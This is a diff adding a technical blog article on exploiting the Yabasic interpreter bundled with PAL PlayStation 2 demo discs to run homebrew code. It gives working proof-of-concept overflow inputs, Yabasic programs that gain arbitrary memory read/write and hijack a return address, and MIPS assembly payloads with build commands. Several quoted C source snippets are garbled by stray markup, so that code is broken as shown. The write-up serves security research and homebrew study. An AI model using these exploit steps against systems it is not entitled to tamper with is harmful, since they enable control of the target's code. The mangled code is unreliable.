@@ -1,0 +1,436 @@
+# Hacking the PS2 with Yabasic
+
+* * *
+
+## Introduction
+
+I recently stumbled upon a PS2 demo disc containing Yabasic, a simple Basic interpreter, and was curious to research whether it could be used for anything interesting. These [demo discs](https://wiki.pcsx2.net/Demo_Disc) shipped with all PAL region PS2 consoles between 2000 - 2003 as an [attempt](https://www.theregister.co.uk/2000/11/07/sony_adds_basic_to_playstation/) to classify the PS2 as a personal computer instead of a video game console for tax reasons (which [ultimately](https://www.theguardian.com/technology/2003/oct/01/business.games) failed, however nowadays video game consoles are no longer subject to this import tax).
+
+In particular, although there are existing methods of running homebrew on PS2 consoles, none of them are perfect since they all seem to have undesirable requirements like opening up your console or purchasing unofficial hardware, or are limited to only specific models.
+
+The most desirable method is to use [FreeMCBoot](https://github.com/TnA-Plastic/FreeMcBoot) to boot from a memory card, however installing this onto said memory card requires an already hacked console. Whilst you could purchase a memory card with FreeMCBoot pre-installed on it by someone else, it would be nice to have a way to install the exploit yourself. That's where I see a Yabasic exploit fitting in nicely, as an entry-point for launching the FreeMCBoot installer. In addition, a Yabasic exploit could be useful for people with the latest slim consoles, which are not vulnerable to FreeMCBoot.
+
+In this article I will describe how I developed an exploit that allows running arbitrary code through Yabasic. Since these programs can be saved and loaded from the memory card, the exploit just need to be typed out once, and can then be reloaded more conveniently in the future. If you're just interested in using the exploit but not the technical analysis you can [checkout the repository](https://github.com/CTurt/PS2-Yabasic-Exploit) for details.
+
+## Setup
+
+For the duration of this article, I will be analysing PBPX-95205, but all versions of Yabasic are vulnerable (the only difference will be finding the right addresses).
+
+### Tools
+
+I disassembled and decompiled using the [PS2 plugin](https://github.com/beardypig/ghidra-emotionengine) for Ghidra. I debugged using the [PCSX2](https://github.com/PCSX2/pcsx2) emulator, and a [plugin](https://github.com/jackun/USBqemu-wheel/releases) which allows USB devices (storage and keyboard).
+
+### Source
+
+Yabasic is [open-source](http://www.yabasic.de/), but the oldest version still available is [2.77.1](https://github.com/marcIhm/yabasic/releases/tag/2.77.1), released [late 2016](http://www.yabasic.de/content_log.html). This may seem like a big difference at first, but in reality the project was dormant for 9 years, and so there were only a few bug fixes made during the time between the PS2 release and 2.77.1. Whilst some of those bug fixes listed could be interesting, such as "A bug with the functions split() and token() has been fixed, which caused to coredumps in some cases.", I decided to just look for my own bugs rather than hunting down the root cause of those bugs.
+
+## Bug hunting
+
+Since Yabasic isn't intended to be a security boundary on modern PCs (you can just use [system](http://www.yabasic.de/yabasic.htm#ref_system) to execute arbitrary commands), there haven't been many prior security reviews of the codebase.
+
+### dotify
+
+There was one buffer overflow [reported in 2009](https://bugs.launchpad.net/ubuntu/+source/yabasic/+bug/424602), [fixed in 2016](https://github.com/marcIhm/yabasic/commit/bb5994214f738290e03d111faaeedcd70e92c885).
+
+The PoC for this issue is pretty straight forward:
+
+`x=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
+
+The `dotify` function is at `0x1240e8` and is indeed vulnerable, meaning we can overflow the 200-byte buffer at `0x3eb0c8`.
+
+Unfortunately, the adjacent memory looks like mostly `0`s, and overflowing into it didn't appear to do anything immediately. Further analysis with disassembler showed that it was just storage for a couple of other strings, and didn't seem like corruption would be very useful for exploitation.
+
+### create_subr_link
+
+The [first](https://github.com/marcIhm/yabasic/issues/32) vulnerability I found was another buffer overflow, similar to the above, but occurs on a stack buffer, rather than a static buffer:
+
+```
+void
+    create_subr_link (char *label)  /* create link to subroutine */
+    {
+        char global[200];
+        char *dot;
+        struct command *cmd;
+
+        if (!inlib) {
+        error(sDEBUG, "not in library, will not create link to subroutine");
+            return;
+        }
+        dot = strchr (label, '.');
+        strcpy (global, library_stack[include_depth-1]->short_name);
+        strcat (global, dot);
+```
+
+This can be triggered by exporting a function with a long name in a library:
+
+`crash.yab`:
+
+`import crashlib`
+
+`crashlib.yab`:
+
+        export sub a.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$()
+          return "foo"
+        end sub
+
+I don't believe this one can be triggered on the PS2 since it doesn't support libraries.
+
+### dim
+
+The [second](https://github.com/marcIhm/yabasic/issues/33) vulnerability I found was an integer overflow when calculating the size of an array.
+
+Yabasic supports declaring up to 10-dimensional arrays using the `dim` command, with the only restriction being that each dimension length must be greater than 0. The allocation size is calculated by adding 1 to all dimensions, multiplying them together, and then multiplying by the size of the type, where the arrays can either hold `char *` or `double`:
+
+```
+void
+    dim (struct command *cmd)    /* get room for array */
+    {
+    ...
+        for (i = 0; i < cmd-="">args; i++) {
+            nbounds[i] = 1 + (int) pop (stNUMBER)->value;
+            if (nbounds[i] <= 1)="" {="" sprintf="" (string,="" "array="" index="" %d="" is="" less="" or="" equal="" zero",="" cmd-="">args - i);
+                error (ERROR, string);
+                return;
+            }
+    ...
+        }
+    ...
+
+        /* count needed memory */
+        ntotal = 1;
+        for (i = 0; i < nar-="">dimension; i++) {
+            (nar->bounds)[i] = nbounds[i];
+            ntotal *= nbounds[i];
+        }
+        esize = (nar->type == 's') ? sizeof (char *) : sizeof (double);    /* size of one array element */
+        nar->pointer = my_malloc (ntotal * esize);</=>
+```
+
+In the latest Yabasic releases `my_malloc` also adds `sizeof(int)` to the final size, but in the PS2 version it doesn't.
+
+The vulnerability is clear; there's no check for integer overflow when multiplying the dimensions together, or multiplying by the type size. The PoC is simple, we just request an array with dimension `0x20000000`, and the size calculation `(0x20000000 + 1) * 8` will overflow to just `8` bytes. Note that since PS2 Yabasic doesn't support hexadecimal numbers with `0x` notation, we'll have to decode them via `dec("20000000")`, or simply use the decimal representation `536870912`:
+
+`dim x(536870912)`
+
+The code will then crash when initializing the 8-byte buffer with `0x20000000` `0.0`s:
+
+```
+    /* initialize Array */
+        for (i = 0; i < ntotal;="" i++)="" {="" if="" (nar-="">type == 's') {
+                nul = my_malloc (sizeof (char));
+                *nul = '\0';
+                ((char **) nar->pointer)[i] = nul;
+            } else {
+                ((double *) nar->pointer)[i] = 0.0;
+            }
+        }
+```
+
+## Exploiting `dim`
+
+Whilst it may not seem like it yet, the `dim` vulnerability gives us the most control, so it's the one we are going to move forward with.
+
+### Making dim bright
+
+The above crash isn't very useful; let's see if we can control the contents instead of just writing `0.0`, or can prevent initialization.
+
+The `dim` command can also used to resize an existing array (it can only be grown, not shrunk), so my first idea was to declare a normal array and then resize it to invalid size, but this doesn't really solve the problem as it will still crash at initializing with `0.0` before the copy occurs:
+
+```
+    /* initialize Array */
+        for (i = 0; i < ntotal;="" i++)="" {="" if="" (nar-="">type == 's') {
+                nul = my_malloc (sizeof (char));
+                *nul = '\0';
+                ((char **) nar->pointer)[i] = nul;
+            } else {
+                ((double *) nar->pointer)[i] = 0.0;
+            }
+        }
+
+        if (oar) {
+            /* copy contents of old array onto new */
+            for (i = 0; i < ototal;="" i++)="" {="" off_to_ind="" (i,="" oar-="">bounds, ind);
+                j = ind_to_off (ind, nar->bounds);
+                if (nar->type == 's') {
+                    my_free (((char **) nar->pointer)[j]);
+                    ((char **) nar->pointer)[j] = ((char **) oar->pointer)[i];
+                } else {
+                    ((double *) nar->pointer)[j] = ((double *) oar->pointer)[i];
+                }
+            }
+            my_free (oar->pointer);
+            my_free (oar);
+        }
+```
+
+And then I realized something magical; both `i` and `ntotal` are signed integers, so a signed comparison will be used for the initialization loop condition above.
+
+Whilst we can't directly create an array with a negative dimension, we can create an array with negative product of dimensions. In the below PoC, we create an array whose `ntotal` is a negative integer `(2 * 0x40000000 = 0x80000000)`, but whose actual buffer size `(0x80000000 * 8 + allocationSize)`, will overflow to just `allocationSize`, where `allocationSize` can be an arbitrary multiple of `16`:
+
+        allocationSize = 16
+        dim x(2 - 1, dec("40000000") + (allocationSize / 8) / 2 - 1)
+
+No initialization will occur when creating this array (due to the signed initialization check), so it won't immediately crash and we are free to use the array to access out of bounds memory:
+
+        for i = 0 to 256
+            print x(0, i)
+        next i
+
+We can also access elements from a negative index; for example, to access the `8` bytes immediately before the buffer we would use index `0xfffffff8 / 8 = 536870911`. With this in mind, we have arbitrary read/write over the entire virtual address space, relative to the buffer.
+
+### Relative to absolute read/write
+
+Before we move onto using the vulnerability to perform any corruption, we need to know how to access arbitrary memory addresses relative to our buffer; for this, we just need to know where our array buffer is allocated.
+
+We can check where our array buffer is allocated by breaking at `0x12cb0c` and examining `v0`:
+
+        0012cb04 jal        my_malloc
+        0012cb08 _mult      a0 ,s0 ,a0
+        0012cb0c beq        s3 ,zero ,LAB_0012cb44
+
+Since our array buffer will be allocated at runtime, after the program has been parsed, its address will be different depending on how many commands our program contains. In particular, I observed that each array assignment command allocates `0x240` bytes, so if we just have a program which allocates the victim array, and then performs a series of `n` array writes, I observed that the array buffer could be calculated as `0xCD7B70 + n * 0x240`.
+
+So, if we want to create a program which writes to just a single memory address, our array buffer will be located at `0xCD7B70 + 1 * 0x240 = 0xCD7DB0`, and to write to address `a`, we would calculate the array index as `((a - 0xCD7DB0) mod 0x100000000) / 8`.
+
+### Hijacking control flow
+
+With arbitrary read/write, let's move onto hijacking control flow. The obvious corruption target for this is a return address on the stack.
+
+When we perform an array assignment, the code responsible in Yabasic is function `doarray`. In the PS2 executable, the actual memory assignment occurs at address `0x12d318`, and then this function jumps to the return address at `0x12d3b8`:
+
+```
+0012d318 sll        v0 ,s3 ,0x3
+    0012d31c ld         v1 ,0x10 (s5 )
+    0012d320 addu       v0 ,a1 ,v0
+    0012d324 beq        zero ,zero ,LAB_0012d390
+    0012d328 _sd        v1 ,0x0 (v0 )
+
+    LAB_0012d390:
+    0012d390 ld         ra ,local_10 (sp )
+    0012d394 ld         s8 ,local_20 (sp )
+    0012d398 ld         s7 ,local_30 (sp )
+    0012d39c ld         s6 ,local_40 (sp )
+    0012d3a0 ld         s5 ,local_50 (sp )
+    0012d3a4 ld         s4 ,local_60 (sp )
+    0012d3a8 ld         s3 ,local_70 (sp )
+    0012d3ac ld         s2 ,local_80 (sp )
+    0012d3b0 ld         s1 ,local_90 (sp )
+    0012d3b4 ld         s0 ,0x0 (sp )=> local_a0
+    0012d3b8 jr         ra
+```
+
+The stack is at `0x1ffeac0` and the offset of the return address is `0x90`, so we want to write to the array from an index which will corrupt `0x1ffeac0 + 0x90`.
+
+As calculated earlier, for a program with a single assignment the array buffer will be allocated at `0xcd7db0`, thus, to write to the return address we need offset `(0x1ffeac0 + 0x90 - 0xcd7db0) / 8 = 2510260`. Let's write the `double` value `1.288230067079646e-231` which encodes to `0x1000000041414141`:
+
+        dim x(1,1073741824)
+        x(0,2510260)=1.288230067079646e-231
+
+This PoC is cool because it jumps to an invalid address, which happens to also crash the emulator PCSX2, so it's 2 PoCs for the price of 1:
+
+        (16b0.2378): Access violation - code c0000005 (!!! second chance !!!)
+        *** WARNING: Unable to verify checksum for C:\Program Files (x86)\PCSX2 1.4.0\pcsx2.exe
+        *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\PCSX2 1.4.0\pcsx2.exe - 
+        eax=00004141 ebx=41414141 ecx=bebf0000 edx=19e1b3b8 esi=41414141 edi=00e280e0
+        eip=02b93016 esp=073af6f0 ebp=073af6f8 iopl=0         nv up ei pl nz na pe nc
+        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+        pcsx2!AmdPowerXpressRequestHighPerformance+0x1abfc0e:
+        02b93016 ff2419          jmp     dword ptr [ecx+ebx]  ds:002b:00004141=????????
+
+A while back I accidentally found a [stack buffer overflow in an N64 emulator](https://twitter.com/CTurtE/status/1126615666356883456) too. It's kind of funny how video game console emulators generally have such bad security that you can easily stumble on vulnerabilities like this by accident.
+
+### Double trouble
+
+When I said we had arbitrary read/write of the entire address space, I wasn't entirely accurate. We can access any 8-bytes in the address space, but only as a `double`. We need to convert back and forth via IEEE 754 encoding when reading or writing memory through our `double` array to access "native" memory, just like you would do with an undersized `Float64` typed array in a JavaScript engine 0-day.
+
+The first restriction of this is that we can't create valid `double`s with all exponent bits set. This means if we attempt to write 8-bytes of hex data starting with `0x7ff` or `0xfff`, the rest of the data will be all `0` (`inf`), or `800...` (`nan`). The following program demonstrates this by showing that 2 `double`s of full exponent encode to the same value; the output is `inf inf 1`.
+
+        print 8.991e308
+        print 8.992e308
+        print 8.991e308 = 8.992e308
+
+A much bigger problem is that the PS2 version of Yabasic seems to round `double`s down to `0` after a certain point, the below prints `6.6e-308, 0`:
+
+`print 6.6e-308, ", ", 6.6e-309`
+
+In practice, one of the most likely issues encountered from not being able to encode anything with a low exponent is any 64-bit number with all upper 4-bytes `0`, such as any 32-bit pointer zero extended to 64-bit, like `0x0000000041414141`. This is why I had to use address `0x1000000041414141` for the control flow hijack PoC above, and it's something we need to address before moving on.
+
+#### Writing native memory
+
+Not being able to write arbitrary values is a big problem when trying to corrupt data structures, and it imposes large restrictions on the payload we can write.
+
+At first it looks like our only solution will be patching existing code to work around this, which I really didn't want to have to resort to since it would bring up cache coherency problems which we won't be able to debug within the emulator.
+
+However, after setting some memory breakpoints, I quickly found the Yabasic source code that parses `double`s and realized that it's a `sscanf` call, meaning that its behaviour can be influenced just by changing the data passed to argument 2:
+
+```
+case 200:
+    YY_RULE_SETUP
+    {
+      { double d;
+        sscanf(yytext,"%lg",&d);
+        yylval.fnum=d;
+        return tFNUM;
+      }
+    }
+```
+
+With some reverse engineering, I found that in the PS2 version, `sscanf` is located at `0x146618`, the call to `sscanf` is located at `0x136fcc`, and the `%lg` string is located at `0x3e29b8`.
+
+If we replace the `double` format specifier with a format specifier for a native number, we'll be able to directly write native memory. Let's try `%lu` (`%lx` will not work well because we'll get a syntax error if we include alpha characters in the number).
+
+A representation of `%lu` in hex we can use is `0x4141414100756c25`, which in `double` is `2261634.0035834485`. The below PoC overwrites the `"%lg"` format used to parse `double`s, with this `"%lu"` representation:
+
+```
+dim x(1, 1073742847)
+
+    # 0x3e29b8 "%lg" -> "%lu"
+    x(0, 535696769) = 2261634.0035834485
+```
+
+With this patch in place, any future programs run will use the new format. Unfortunately, if we rely on this it means we need to run 2 programs for our exploit instead of having it 1-shot, since all `double` parsing happens before execution of the assignment. Yabasic does support dynamic code generation with [`compile`](http://www.yabasic.de/yabasic.htm#ref_compile) which could work, however the PS2 version doesn't support this.
+
+#### Reading native memory
+
+Whilst not necessary if just writing and executing a payload, it may be useful to be able to read native memory too for debugging purposes when developing the exploit.
+
+Just like our patch for writing native memory, we'll aim to patch a format specifier instead of code itself to prevent cache coherency issues. This time we want to replace conversion of `double` to string with conversion of native number to string. In Yabasic, this conversion is done here:
+
+```
+    case 'd':            /* print double value */
+            p = pop(stNUMBER);
+            d = p->value;
+            n = (int)d;
+            if (n == d && d <= long_max="" &&="" d="">= LONG_MIN) {
+                sprintf(string, "%s%ld", (last == 'd') ? " " : "", n);
+            } else {
+                sprintf(string, "%s%g", (last == 'd') ? " " : "", d);
+            }
+            onestring(string);
+            break;</=>
+```
+
+As you can see, it's already converted to integer before being passed to `sprintf` in the first case, so we can't alter this behaviour by just patching data.
+
+However, there is function `myformat` we can attack, it has a whitelist of allowed formats we can patch:
+
+```
+        if (!strchr ("feEgG", c1) || form[i]) {
+                return FALSE;
+            }
+            /* seems okay, let's print */
+            sprintf (dest, format, num);
+```
+
+In the PS2 executable, this `"feEgG"` string is located at `0x3e2710`. If we patch it to `"feEgGx"` we can use format `"%0.8x"` to read native memory in hex:
+
+```
+# Run %lg -> %lu patch before this!
+
+    dim x(1,1073741824)
+
+    # 0x3e2710 "feEgG" -> "feEgGx"
+    x(0, 535696684) = 132248070612326.0
+    
+```
+
+After executing the above patch, we can open another window to act as our "debugger", and print 32-bit hex values. The below PoC prints memory at `0x480000` which is an unused region I chose to write debug output to from my payloads:
+
+        dim x(1,1073741824)
+        print x(0, 535777310) using "%0.8x"
+
+## Arbitrary code execution
+
+With unrestricted arbitrary write, we can begin testing arbitrary code execution! For our first PoC, let's just write the address of the return address we corrupted to our unused memory address `0x480000`, and then return gracefully, so that we can inspect it in our "debugger" window.
+
+To do this, we could just jump back to the original return address, `0x123428`. However, it's worth also restoring the stack pointer (`-= 0xa0`), so we can jump back to the original function epilogue at `0x12d394` and have all of the callee saved registers restored again, as this let's us use all registers freely in our payload:
+
+        .set noreorder # If we're writing assembly, why would we want this?
+        .globl _start
+        _start:
+            li $s0, 0x480000
+            sw $v0, ($s0)
+        .globl return
+        return:
+            li $ra, 0x123428
+            add $s0, $ra, (0x12d394 - 0x123428)
+            jr $s0
+            sub $sp, 0xa0
+
+Compiling this payload:
+
+        ee-gcc payload.s -o payload.elf -nostartfiles -nostdlib
+        ee-objcopy -O binary payload.elf payload.bin
+
+And then running it through [this program](https://github.com/CTurt/PS2-Yabasic-Exploit/tree/master/maker.c) to convert a payload into a Yabasic exploit, we will get the following. Note that we write and jump to our code through uncached virtual addresses to avoid cache coherency problems (EG: `0x20CD7B70` instead of `0xCD7B70`).
+
+```
+# Run %lg -> %lu patch before this!
+
+    dim x(1,1073741825)
+    x(0,67108864)=12538584313560563784.0
+    x(0,67108865)=4035001138559254546.0
+    x(0,67108866)=279645527673511788.0
+    x(0,67108867)=2575495349741289480.0
+
+    x(0,2509972)=550340272.0
+    
+```
+
+After running this, we can switch to our "debugger" window and print the debug value. This will print `01ffeb50`, just as we expected, demonstrating that we now have a way to run arbitrary code and inspect the results!
+
+When writing more complicated payloads, recall that on entry `$ra` holds the address we jumped to, so points to the uncached address of our payload, but also note that on entry `$a1` points to the start of the buffer, so that's the cached address of the payload. Knowing this, we can reference both code and data relative to those registers to achieve position-independent code.
+
+## Using strings in payloads
+
+Now that we can exploit Yabasic to run arbitrary native code, we need to write a payload which can load an ELF from a controlled source (USB, HDD, ethernet, iLink, burned disc). Whilst there's not really a hard limit on the size of the payload, preferably it should be as small as possible to prevent needing to type out too much.
+
+As there is a large variety of interesting creative solutions for this, I won't go into them in this article, so as not to detract from the focus of this article. I will work on some of them in the background, and upload them to the repository eventually - hopefully by publishing this article I can attract some interest from the open source community to contribute here :)
+
+However, just to provide a slightly more interesting payload to test for now, and demonstrate how to reference strings, let's try booting one of the many other demos accessible on the same disc. For PBPX-95205, we have a FIFA 2001 demo we can try booting (`cdrom0:\FIFADEMO\GAMEZ.ELF`).
+
+To do this, we'll just invoke the `LoadExecPS2` system call (number 6), which allows you to easily specify an executable path. Remembering that we want to keep the payload as small as possible, we can violate the calling convention by leaving `argv` (`$a2`) uninitialized, since the argument count (`$a1`) is `0`, even though this is technically incorrect:
+
+        .global _start
+        _start:
+            addu $a0, $a1, 4 * 4
+            li $a1, 0
+            li $v1, 6
+            syscall
+        .asciiz "cdrom0:\\FIFADEMO\\GAMEZ.ELF"
+
+Whilst this works, we can make an easier payload to type out by taking advantage of the fact that we can store strings in Yabasic. Create a corresponding `"boot-fifa.string"` file, and then we can reference the string data from the payload address minus `0x2e0`:
+
+        .global _start
+        _start:
+            sub $a0, $a1, 0x2e0 # Point to cached s$
+            li $a1, 0
+            li $v1, 6
+            syscall # LoadExecPS2
+
+This produces the following, which is pretty quick to type out:
+
+```
+# Run %lg -> %lu patch before this!
+
+    dim x(1,1073741824)
+    x(0,67108864)=2595480760796642592.0
+    x(0,67108865)=52143783942.0
+
+    x(0,2510080)=550339408.0
+    s$="cdrom0:\FIFADEMO\GAMEZ.ELF"
+```
+
+## Porting to other demo discs
+
+All analysis up until this point has been on PBPX-95205, but Sony shipped 3 other [demo discs](https://wiki.pcsx2.net/Demo_Disc) which contain Yabasic, with unique serials. PBPX-95204 has the exact same `YABASIC.ELF` as PBPX-95205, however PBPX-95506 has a different version, which I've [ported the exploit to](https://github.com/CTurt/PS2-Yabasic-Exploit/). Unfortunately, I haven't been able to find a PBPX-95520 disc on eBay so I haven't been able to port to this demo disc, but for completeness if someone reading does have a copy, please consider getting in touch.
+
+Note that there are multiple "versions" of demo discs that have the same serial, such as a PBPX-95204 printed with the old "PS2" logo, and a PBPX-95204 with the updated disc design, but to my knowledge, all demo discs with the same serial number have the same executables on them. The PBPX-95205 is especially interesting since there is a version printed on a blue CD (looks like [this](https://i.ytimg.com/vi/il7rkXlc0wI/maxresdefault.jpg)), and a version printed on a DVD (looks like [this](https://ia800608.us.archive.org/4/items/Playstation_2_Demo_Disc_PBPX-95205_Sony/Playstation%202%20Demo%20Disc%20%28PBPX-95205%29%28Sony%29.png)).
+
+## Conclusion
+
+Nowadays, scripting engines for languages like JavaScript are usually the first thing attacked in modern video game consoles, so I find it odd how the PS2 release of Yabasic has received so little attention from hackers given that it was bundled with every console in PAL region for the first 3 years, and is easy to dump and analyse, especially being based on open source code. Regardless, these discs are readily available for cheap today, and so it's my hope that at least some people will benefit from having a slightly more convenient homebrew method than having to open up their consoles or purchase more expensive, unofficial hardware.
+
+Unfortunately, NTSC regions never received a Yabasic port, however they do have a different Basic interpreter, "Basic Studio", which I might look at in the future.
+
+Finally, maybe now that the Yabasic can be used to execute arbitrary code, Sony can argue that it really did allow the PS2 to be ["freely programmed"](https://www.casemine.com/judgement/uk/5a8ff7bb60d03e7f57eb19db) after all, and they can claim back their import taxes :P
